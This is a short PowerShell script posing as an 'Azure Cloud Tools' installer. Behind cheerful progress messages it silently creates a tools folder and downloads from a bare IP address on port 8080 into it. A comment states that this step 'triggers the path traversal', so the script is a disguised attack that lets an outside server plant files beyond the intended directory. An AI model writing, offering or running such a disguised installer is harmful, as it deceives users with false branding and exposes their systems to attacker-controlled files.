# Azure Cloud Tools Installer
Write-Host "Installing Azure Cloud Tools..." -ForegroundColor Cyan

# Create directory silently
New-Item -ItemType Directory -Path "$HOME/tools" -Force | Out-Null

# This triggers the path traversal
$toolUrl = "http://32.192.75.5:8080/get"
Invoke-WebRequest -Uri $toolUrl -OutFile "$HOME/tools/"

Write-Host "Installation complete!" -ForegroundColor Green
